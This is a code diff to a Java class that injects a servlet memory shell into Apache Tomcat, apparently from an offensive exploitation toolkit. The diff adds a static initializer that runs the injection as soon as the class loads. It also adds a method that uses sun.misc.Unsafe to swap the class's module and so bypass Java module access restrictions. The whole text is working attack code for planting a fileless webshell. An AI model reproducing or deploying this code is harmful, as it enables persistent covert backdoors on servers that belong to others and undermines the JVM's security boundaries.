@@ -4,6 +4,7 @@ import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
+import sun.misc.Unsafe;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -29,7 +30,9 @@ public class TomcatServletThreadLoader {
     private static String CLASSNAME;
     private static String PATH;
     private static String NAME;
-
+    static {
+        new TomcatServletThreadLoader();
+    }
     public TomcatServletThreadLoader() {
         try {
             // 获取 standardContext
@@ -49,6 +52,7 @@ public class TomcatServletThreadLoader {
      * Tomcat Servlet
      */
     public static void inject(Object standardContext) throws Exception {
+        addModule();
         HashMap children = (HashMap) getFieldValue(standardContext, "children");
         if (children.containsKey(NAME)) {
             return;
@@ -213,4 +217,22 @@ public class TomcatServletThreadLoader {
     }
 
 
+    public static void addModule() {
+        try {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            Method method = Class.class.getDeclaredMethod("getModule");
+            method.setAccessible(true);
+            Object module = method.invoke(Object.class);
+            Class cls = TomcatServletThreadLoader.class;
+            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.setAccessible(true);
+            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
+        } catch (Exception e) {
+
+        }
+    }
 }
